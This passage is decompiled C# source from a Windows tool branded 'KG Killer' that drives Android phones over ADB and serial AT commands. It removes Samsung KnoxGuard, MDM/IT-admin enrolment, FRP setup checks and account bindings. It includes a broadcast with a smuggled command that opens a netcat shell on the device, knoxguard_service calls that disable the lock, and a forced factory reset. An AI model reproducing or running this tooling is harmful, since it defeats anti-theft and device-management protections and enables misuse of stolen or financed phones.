					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.videos");
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.videos");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.apps.docs");
					Adb.AdbCommand("adb shell pm uninstall --user 0 com.google.android.apps.docs");
					Adb.AdbCommand("shell pm disable-user --user 0 com.android.hotwordenrollment.xgoogle");
					Adb.AdbCommand("adb shell pm uninstall --user 0 com.android.hotwordenrollment.xgoogle");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.googlequicksearchbox");
					this.Logs("OK\n", Color.Green);
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.googlequicksearchbox");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.calendar");
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.calendar");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.apps.subscriptions.red");
					Adb.AdbCommand("adb shell pm uninstall --user 0 com.google.android.apps.subscriptions.red");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.apps.googleassistant");
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.apps.googleassistant");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.gm");
					Adb.AdbCommand("shell pm clear --user 0 com.google.android.gm");
					this.Logs("Removing Security :", Color.FloralWhite);
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.gm");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.contacts");
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.contacts");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.apps.chromecast.app");
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.apps.chromecast.app");
					this.Logs("OK\n", Color.Green);
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.onetimeinitializer");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.apps.walletnfcrel");
					Adb.AdbCommand("shell pm uninstall --user 0  com.google.android.apps.walletnfcrel");
					Adb.AdbCommand("shell pm disable-user --user 0 com.netflix.mediaclient");
					Adb.AdbCommand("shell pm uninstall --user 0  com.netflix.mediaclient");
					this.Logs("Finalizing...", Color.FloralWhite);
					Adb.AdbCommand("shell pm uninstall --user 0 com.android.nfc");
					Adb.AdbCommand("shell pm uninstall --user 0 cn.wps.moffice_eng");
					Adb.AdbCommand("shell pm uninstall --user 0 com.att.miatt");
					Adb.AdbCommand("shell pm disable-user --user 0 com.att.miatt");
					Adb.AdbCommand("shell pm disable-user --user 0 com.hihonor.systemappsupdater");
					Adb.AdbCommand("shell pm uninstall --user 0 com.hihonor.systemappsupdater");
					this.Logs("OK\n", Color.Green);
					await Task.WhenAll(new Task[]
					{
						Task.Run(delegate
						{
							this.InstallApk("dpc.apk", "install");
						}),
						Task.Delay(100)
					});
					Adb.AdbCommand("shell am start -S com.dpc.ts/com.afwsamples.testdpc.SetupManagementLaunchActivity");
					MessageBox.Show("Connect to the internet, Add an account to IT Admin and finish the setup. ");
					MessageBox.Show("DO NOT PRESS OK OR CLOSE YOU VERIFY THAT GOOGLE PLAY WORKS");
					Adb.AdbCommand("shell pm path com.google.android.gms");
					Adb.AdbCommand("shell pm clear --user 0 com.google.android.gms");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.gms");
					Adb.AdbCommand("shell pm uninstall --user 0 com.google.android.gms");
					this.Logs("\n Sucessfully Removed BY KG Killer...", Color.Gold);
					props = null;
				}
			}
			else
			{
				await this.WaitForDevices();
			}
		}

		// Token: 0x060000FE RID: 254 RVA: 0x0000A4D4 File Offset: 0x000086D4
		private async void button7_Click_1(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			MessageBox.Show("If You Fail Then Try Again Same Process", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			string usernamee = Form3.usrname;
			this.Logs("\nUser :", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation:", Color.FloralWhite);
			this.Logs("IT Admin (Tecno,Infinix,Itel)\n", Color.Gold);
			this.Logs("\n\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (this.CheckRunAdb())
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Model  : ", Color.FloralWhite);
						this.Logs(props["ro.product.model"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Brand: ", Color.FloralWhite);
						this.Logs(props["ro.product.brand"], Color.Red);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Version  : ", Color.FloralWhite);
						this.Logs(props["ro.build.version.incremental"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Build date  : ", Color.FloralWhite);
						this.Logs(props["ro.build.date"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Security patch  : ", Color.FloralWhite);
						this.Logs(props["ro.build.version.security_patch"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android version  : ", Color.FloralWhite);
						this.Logs(props["ro.build.version.release"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
					this.Logs("Start Removing IT Admin...", Color.FloralWhite);
					Adb.AdbCommand("shell pm disable-user --user 0 com.android.cts.ctsshim");
					Adb.AdbCommand("uninstall --user 0 com.android.cts.ctsshim");
					Adb.AdbCommand("shell pm disable-user --user 0 com.android.cts.priv.ctsshim");
					Adb.AdbCommand(" uninstall --user 0 com.android.cts.priv.ctsshim");
					Adb.AdbCommand(" shell pm disable-user --user 0 com.android.proxyhandler");
					Adb.AdbCommand("uninstall --user com. android. proxyhandler");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.configupdater");
					this.Logs("\n Removing IT Admin :", Color.FloralWhite);
					Adb.AdbCommand("uninstall --user 0 com.google.android.configupdater");
					Adb.AdbCommand("shell pm disable-user --user 0 com.transsion.plat.appupdate");
					Adb.AdbCommand("uninstall --user 0 com. transsion. plat. appupdate");
					Adb.AdbCommand("shell pm disable-user --user 0 com.transsion.systemupdate");
					this.Logs("OK\n", Color.Green);
					Adb.AdbCommand(" uninstall --user 0 com.transsion.systemupdate");
					Adb.AdbCommand("reboot");
					this.Logs("\n Sucessfully Removed BY KG Killer...", Color.Gold);
					props = null;
				}
			}
			else
			{
				await this.WaitForDevices();
			}
		}

		// Token: 0x060000FF RID: 255 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000100 RID: 256 RVA: 0x0000A51C File Offset: 0x0000871C
		private void button8_Click_1(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000A534 File Offset: 0x00008734
		private async void button9_Click(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			MessageBox.Show("Please Try Again Same Process If Your Device is Locked", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			string usernamee = Form3.usrname;
			this.Logs("\nUser : ", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation :", Color.FloralWhite);
			this.Logs("KG Android 14 New Method 1\n", Color.Gold);
			try
			{
				this.Logs("\n\nChecking ADB Server..", Color.FloralWhite);
				await Task.Delay(100);
				if (!this.CheckRunAdb())
				{
					TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
					if (!taskAwaiter.IsCompleted)
					{
						await taskAwaiter;
						TaskAwaiter taskAwaiter2;
						taskAwaiter = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter);
					}
					taskAwaiter.GetResult();
				}
				else
				{
					this.Logs("Running\n", Color.Green);
					TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
					TaskAwaiter taskAwaiter2;
					if (!taskAwaiter3.IsCompleted)
					{
						await taskAwaiter3;
						taskAwaiter3 = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter);
					}
					taskAwaiter3.GetResult();
					this.Logs("Searching devices..\n", Color.FloralWhite);
					await Task.Delay(10);
					this.progressBar1.Value = 10;
					if (this.CariAdbDevice())
					{
						TaskAwaiter taskAwaiter4 = Task.Delay(10).GetAwaiter();
						if (!taskAwaiter4.IsCompleted)
						{
							await taskAwaiter4;
							taskAwaiter4 = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter4.GetResult();
						this.adbclients.SetDevice(this.SnAdb);
						Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
						try
						{
							this.Logs("Model  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.model"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Brand  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.brand"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("CPU  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.board"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Version  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.incremental"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Build date  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.date"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Security patch  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.security_patch"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android version  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.release"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android SDK  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.sdk"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("KG STATUS➾ ", Color.FloralWhite);
							this.Logs(props["knox.kg.state"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.progressBar1.Value = 20;
						}
						catch (Exception ex)
						{
							Console.WriteLine("Error: " + ex.Message);
						}
						this.Logs("Writing Data File ", Color.FloralWhite);
						this.Logs(" OK\n", Color.FloralWhite);
						await Task.Delay(100);
						this.progressBar1.Value = 40;
						await this.PushApkAsync("fota_apk.apk", "/data/local/tmp/fota_apk.apk");
						await Task.Delay(500);
						this.Logs("Writing Data File To System ", Color.FloralWhite);
						string[] adbCommands = new string[]
						{
							"pm install /data/local/tmp/fota_apk.apk", "mkdir /sdcard/mdmfixtool", "pm uninstall-system-updates com.samsung.android.kgclient", "pm disable-user --user 0 com.samsung.android.kgclient", "pm uninstall --user 0 com.android.systemui", "pm uninstall --user 0 com.samsung.klmsagent", "pm uninstall --user 0 com.android.ons", "pm uninstall --user 0 com.android.dynsystem", "pm uninstall --user 0 com.samsung.android.app.updatecenter", "pm uninstall --user 0 com.google.android.configupdater",
							"pm uninstall --user 0 com.wssyncmldm", "pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms", "am set-inactive com.samsung.android.kgclient true", "am kill com.samsung.android.kgclient", "am crash com.samsung.android.kgclient", "am stop-app com.samsung.android.kgclient", "pm uninstall-system-updates com.samsung.android.kgclient", "pm disable-user --user 0 com.samsung.android.kgclient", "pm enable --user 0 com.samsung.android.kgclient", "pm uninstall-system-updates com.samsung.android.kgclient",
							"pm suspend com.samsung.android.kgclient", "pm uninstall --user 0 com.samsung.android.kgclient", "am start -n com.sdet.fotaagent/.Main", "am broadcast -a com.sdet.fotaagent.intent.CP_FILE -e CP_FILE /sdcard/mdmfixtool -e CP_LOC \"/data/data/com.samsung.SMT && /system/bin/sh -c \"toybox netcat -s 127.0.0.1 -p 8133 -L sh -l\"\""
						};
						this.Logs(" OK\n", Color.Green);
						this.progressBar1.Value = 50;
						this.Logs("Erase KG ", Color.FloralWhite);
						Thread.Sleep(1100);
						foreach (string command in adbCommands)
						{
							this.adbclients.ExecuteRemoteCommand(command);
							Thread.Sleep(200);
							command = null;
						}
						string[] array = null;
						List<string> list3 = new List<string>
						{
							"nc localhost 8133 || nc 127.0.0.1 8133", "service call knoxguard_service 36", "service call knoxguard_service 40 s16 'null'", "service call knoxguard_service 39", "pm suspend com.samsung.android.kgclient", "am set-inactive com.samsung.android.kgclient true", "pm enable --user 0 com.samsung.android.kgclient", "pm install-existing --restrict-permissions --user 0 com.samsung.android.kgclient", "am kill com.samsung.android.kgclient", "am crash com.samsung.android.kgclient",
							"am stop-app com.samsung.android.kgclient", "cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND deny", "cmd appops set com.samsung.android.kgclient RUN_ANY_IN_BACKGROUND deny", "cmd appops set com.samsung.android.kgclient WAKE_LOCK deny", "pm install-existing --restrict-permissions --user 0 com.android.systemui", "am force-stop com.sdet.fotaagent --user 0", "pm uninstall --user 0 com.sdet.fotaagent", "reboot"
						};
						this.progressBar1.Value = 80;
						Process process3 = ShellController.CreateShellProcess();
						foreach (string command2 in list3)
						{
							string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
							output = this.CustomizeOutput(output);
							output = null;
							command2 = null;
						}
						List<string>.Enumerator enumerator = default(List<string>.Enumerator);
						ShellController.CloseShellProcess(process3);
						this.Logs(" Ok\n", Color.Green);
						this.progressBar1.Value = 90;
						string text = await this.<button9_Click>g__GetWaitForDevicesResultAsync|78_0();
						string result = text + "\n";
						text = null;
						this.Logs("KG STATUS: ", Color.FloralWhite);
						this.Logs(props["knox.kg.state"] + " \n", Color.Green);
						this.progressBar1.Value = 100;
						this.Logs("KG Removed Sucessfully By KG Killer\n\r", Color.Gold);
						Thread.Sleep(2000);
						this.Logs("This Is Beta Method\r\n", Color.Gold);
						this.Logs("If Your Device Is Still Locked\r\n", Color.Red);
						this.Logs("Contact US On Telegram\r\n", Color.Gold);
						this.progressBar1.Value = 0;
						props = null;
						adbCommands = null;
						list3 = null;
						process3 = null;
					}
					else
					{
						this.Logs("Device not found", Color.Red);
					}
				}
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Error: " + ex2.Message);
			}
		}

		// Token: 0x06000102 RID: 258 RVA: 0x0000A57C File Offset: 0x0000877C
		private async void button22_Click(object sender, EventArgs e)
		{
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (!this.CheckRunAdb())
			{
				TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
			}
			else
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter3.IsCompleted)
				{
					await taskAwaiter3;
					TaskAwaiter taskAwaiter2;
					taskAwaiter3 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter3.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Model  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.product.model"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("KG STATUS➾ ", Color.FloralWhite);
						this.Logs(props["knox.kg.state"], Color.Red);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.incremental"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Build date  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.date"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Security patch  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.security_patch"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.release"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
					this.Logs("Removing", Color.Green);
					Adb.AdbCommand("shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1");
					Adb.AdbCommand("shell pm disable-user --user 0 com.sec.android.app.setupwizard");
					Adb.AdbCommand("shell pm disable-user --user 0 com.sec.android.app.setupwizardlegalprovider");
					Adb.AdbCommand("shell pm disable-user --user 0 com.sec.android.app.SecSetupWizard");
					Adb.AdbCommand("reboot");
					this.Logs("Successfully Removed FRP", Color.Green);
					props = null;
				}
			}
		}

		// Token: 0x06000103 RID: 259 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void KGKiller_InputLanguageChanging(object sender, InputLanguageChangingEventArgs e)
		{
		}

		// Token: 0x06000104 RID: 260 RVA: 0x0000A5C4 File Offset: 0x000087C4
		private void pictureBox2_Click(object sender, EventArgs e)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "https://kgkiller.com/",
				UseShellExecute = true
			});
		}

		// Token: 0x06000105 RID: 261 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void label3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000106 RID: 262 RVA: 0x0000A5F0 File Offset: 0x000087F0
		private async void button23_Click(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			MessageBox.Show("If You Fail Then Try Again Same Process", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			string usernamee = Form3.usrname;
			this.Logs("\nUser :", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation :", Color.FloralWhite);
			this.Logs("IT Admin Universal\n", Color.Gold);
			this.Logs("\n\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (this.CheckRunAdb())
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Model  : ", Color.FloralWhite);
						this.Logs(props["ro.product.model"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Brand: ", Color.FloralWhite);
						this.Logs(props["ro.product.brand"], Color.Red);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Version  : ", Color.FloralWhite);
						this.Logs(props["ro.build.version.incremental"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Build date  : ", Color.FloralWhite);
						this.Logs(props["ro.build.date"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Security patch  : ", Color.FloralWhite);
						this.Logs(props["ro.build.version.security_patch"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android version  : ", Color.FloralWhite);
						this.Logs(props["ro.build.version.release"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
					await Task.WhenAll(new Task[]
					{
						Task.Run(delegate
						{
							this.InstallApk("dpc.apk", "install");
						}),
						Task.Delay(100)
					});
					Adb.AdbCommand("shell am start -n com.afwsamples.testdpc/com.afwsamples.testdpc.SetupManagementLaunchActivity");
					MessageBox.Show("Setup Work Profile And Continue", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					this.Logs("\nRemoving MDM", Color.FloralWhite);
					Adb.AdbCommand("shell pm disable-user --user 0 com.android.cts.ctsshim");
					Adb.AdbCommand("uninstall --user 0 com.android.cts.ctsshim");
					Adb.AdbCommand("shell pm disable-user --user 0 com.android.cts.priv.ctsshim");
					Adb.AdbCommand("uninstall --user 0 com.android.cts.priv.ctsshim");
					this.Logs("Ok\n", Color.Green);
					Adb.AdbCommand("shell pm disable-user --user 0 com.android.proxyhandler");
					Adb.AdbCommand("uninstall --user com. android. proxyhandler");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.configupdater");
					this.Logs("\n Cleaning Device", Color.FloralWhite);
					Adb.AdbCommand("uninstall --user 0 com.google.android.configupdater");
					Adb.AdbCommand("shell pm disable-user --user 0 com.transsion.plat.appupdate");
					Adb.AdbCommand("uninstall --user 0 com. transsion. plat. appupdate");
					this.Logs("Done\n", Color.Green);
					Adb.AdbCommand("shell pm disable-user --user 0 com.transsion.systemupdate");
					Adb.AdbCommand("uninstall --user 0 com.transsion.systemupdate");
					this.Logs("\n Removing IT Admin...", Color.FloralWhite);
					Adb.AdbCommand("uninstall --user 0 com.google.android.gms.supervision");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.gms.supervision");
					Adb.AdbCommand("uninstall --user 0 com.samsung.android.knox.zt.framework");
					Adb.AdbCommand("shell pm disable-user --user 0 com.samsung.android.knox.zt.framework");
					this.Logs("Ok\n", Color.Green);
					this.Logs("\n Sucessfully Removed BY KG Killer...", Color.Gold);
					props = null;
				}
			}
			else
			{
				await this.WaitForDevices();
			}
		}

		// Token: 0x06000107 RID: 263 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void progressBar1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000108 RID: 264 RVA: 0x0000A638 File Offset: 0x00008838
		private async void button24_Click(object sender, EventArgs e)
		{
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (!this.CheckRunAdb())
			{
				TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
			}
			else
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter3.IsCompleted)
				{
					await taskAwaiter3;
					TaskAwaiter taskAwaiter2;
					taskAwaiter3 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter3.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.progressBar1.Value = 0;
						this.Logs("Model  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.product.model"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("KG STATUS➾ ", Color.FloralWhite);
						this.Logs(props["knox.kg.state"], Color.Red);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.incremental"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Build date  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.date"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Security patch  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.security_patch"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.release"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.progressBar1.Value = 10;
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
					this.progressBar1.Value = 50;
					this.Logs("Removing", Color.Green);
					Adb.AdbCommand("shell pm clear com.samsung.android.mobileservice");
					Adb.AdbCommand("shell pm clear com.samsung.android.scloud");
					Adb.AdbCommand("adb shell pm clear com.osp.signin");
					this.progressBar1.Value = 100;
					this.Logs("Enjoy Your Phone Without Sam. account", Color.Gold);
					this.progressBar1.Value = 0;
					props = null;
				}
			}
		}

		// Token: 0x06000109 RID: 265 RVA: 0x0000A680 File Offset: 0x00008880
		private void button18_Click(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			if (MessageBox.Show("Are you want to do Factory Reset", "KG Killer", MessageBoxButtons.OKCancel) == DialogResult.OK)
			{
				KGKiller.ComPort comPort = this.Adb_Devices.SelectedItem as KGKiller.ComPort;
				if (comPort != null)
				{
					this.Logs("\t\nOPERATION\t:Factory Reset...\n", Color.Green);
					KGKiller._serialPort = new SerialPort
					{
						PortName = comPort.Name
					};
					try
					{
						KGKiller._serialPort.BaudRate = 115200;
						KGKiller._serialPort.Open();
						if (KGKiller._serialPort.IsOpen)
						{
							this.ResultTxt.Text = "Factory Reset...\r\n";
							this.ResultTxt.Text = "OK \r\n";
							KGKiller._serialPort.Write("AT+FACTORST=0,0\r\n");
							Thread.Sleep(1000);
							KGKiller._serialPort.Write("AT+FACTORST=0,0\r\r\n");
							Thread.Sleep(1000);
							KGKiller._serialPort.Write("AT+CRST=FS\r\n");
							Thread.Sleep(1000);
							KGKiller._serialPort.Write("AT%FRST\r\n");
							Thread.Sleep(1000);
							KGKiller._serialPort.Write("AT^RESET\r\n");
							Thread.Sleep(1000);
							Thread.Sleep(1000);
							this.ResultTxt.Text = "Done!\r\n";
						}
						else
						{
							this.Logs("Failed to open port, check the port and try again \r\n", Color.Red);
						}
					}
					catch
					{
					}
					finally
					{
						if (KGKiller._serialPort.IsOpen)
						{
							KGKiller._serialPort.Close();
						}
					}
				}
			}
		}

		// Token: 0x0600010A RID: 266 RVA: 0x0000A820 File Offset: 0x00008A20
		private void button25_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Is Your Device in MTP Mode ", "KG Killer", MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				KGKiller.ComPort comPort = this.Adb_Devices.SelectedItem as KGKiller.ComPort;
				if (comPort != null)
				{
					this.Logs("Rebooting....\r\n", Color.Green);
					KGKiller._serialPort = new SerialPort
					{
						PortName = comPort.Name
					};
					try
					{
						KGKiller._serialPort.BaudRate = 115200;
						KGKiller._serialPort.Open();
						if (KGKiller._serialPort.IsOpen)
						{
							KGKiller._serialPort.Write("AT+SUDDLMOD=0,0\r\n");
						}
						else
						{
							this.Logs("Failed to open port, check the port and try again \r\n", Color.Red);
						}
					}
					catch
					{
					}
					finally
					{
						if (KGKiller._serialPort.IsOpen)
						{
							KGKiller._serialPort.Close();
						}
					}
				}
			}
		}

		// Token: 0x0600010B RID: 267 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void tabPage1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600010C RID: 268 RVA: 0x0000A908 File Offset: 0x00008B08
		private void button26_Click(object sender, EventArgs e)
		{
			Thread.Sleep(2000);
			MessageBox.Show("Only Indian Devices are Supported", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			imei imei = new imei();
			imei.Show();
			Thread.Sleep(500);
			this.Logs("After Submit IMEI Follow These Steps\r\n", Color.Gold);
			this.Logs("Connect your device with Internet\r\n", Color.FloralWhite);
			this.Logs("Click On Support \r\n", Color.FloralWhite);
			this.Logs("And Refresh Account Status  \r\n", Color.FloralWhite);
			this.Logs("Wait 10 Min \r\n", Color.FloralWhite);
			this.Logs("Device will Successfully Unlock \r\n", Color.Green);
		}

		// Token: 0x0600010D RID: 269 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void label5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600010E RID: 270 RVA: 0x0000A9A8 File Offset: 0x00008BA8
		private void button27_Click(object sender, EventArgs e)
		{
			QR_1 qr_ = new QR_1();
			qr_.Show();
		}

		// Token: 0x0600010F RID: 271 RVA: 0x0000A9C4 File Offset: 0x00008BC4
		private void button28_Click(object sender, EventArgs e)
		{
			qr2 qr = new qr2();
			qr.Show();
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0000A9E0 File Offset: 0x00008BE0
		private string GenerateHWID()
		{
			string text = string.Empty;
			try
			{
				string biosserialNumber = this.GetBIOSSerialNumber();
				string processorID = this.GetProcessorID();
				string hardDriveSerialNumber = this.GetHardDriveSerialNumber();
				string biosproduct = this.GetBIOSproduct();
				string text2 = biosserialNumber + processorID + hardDriveSerialNumber + biosproduct;
				if (!string.IsNullOrEmpty(text2))
				{
					text = this.GenerateMD5Hash(text2);
				}
				else
				{
					text = "HWID not found.";
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("An error occurred while generating the HWID: " + ex.Message);
			}
			return text;
		}

		// Token: 0x06000111 RID: 273 RVA: 0x0000AA68 File Offset: 0x00008C68
		private string GetBIOSSerialNumber()
		{
			string text = string.Empty;
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
